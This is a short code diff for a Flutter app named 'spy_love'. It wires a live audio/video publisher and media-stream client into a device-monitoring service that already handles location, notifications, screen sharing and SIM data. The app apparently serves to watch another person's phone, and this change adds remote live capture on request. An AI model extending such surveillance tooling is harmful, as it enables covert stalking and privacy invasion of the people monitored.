@@ -13,6 +13,8 @@ import 'package:spy_love/features/monitoring/geofence_math.dart';
 import 'package:spy_love/features/monitoring/monitored_device_storage.dart';
 import 'package:spy_love/features/monitoring/notification_bridge.dart';
 import 'package:spy_love/features/monitoring/screen_share/screen_share_service.dart';
+import 'package:spy_love/features/monitoring/live_av/live_av_publisher_service.dart';
+import 'package:spy_love/core/network/media_stream_client.dart';
 import 'package:spy_love/features/monitoring/sim_bridge.dart';
 import 'package:spy_love/features/monitoring/sim_state_storage.dart';
 import 'package:spy_love/core/permissions/app_permission.dart';
@@ -35,6 +37,8 @@ class MonitoringService {
     this._safeZones,
     this._screenShare,
     this._screenStream,
+    this._liveAv,
+    this._mediaStream,
   ]);
 
   final EventRepository _events;
@@ -42,6 +46,8 @@ class MonitoringService {
   final SafeZoneRepository? _safeZones;
   final ScreenShareService? _screenShare;
   final ScreenStreamClient? _screenStream;
+  final LiveAvPublisherService? _liveAv;
+  final MediaStreamClient? _mediaStream;
   Timer? _syncTimer;
   StreamSubscription<Map<String, dynamic>>? _notificationSub;
   StreamSubscription<Position>? _locationSub;
@@ -105,6 +111,11 @@ class MonitoringService {
     final screenStream = _screenStream;
     if (screenShare != null && screenStream != null) {
       screenShare.watchForRequests(deviceId, screenStream);
+    }
+    final liveAv = _liveAv;
+    final mediaStream = _mediaStream;
+    if (liveAv != null && mediaStream != null) {
+      liveAv.watchForRequests(deviceId, mediaStream);
     }
     if (!_owns(epoch)) return;
 
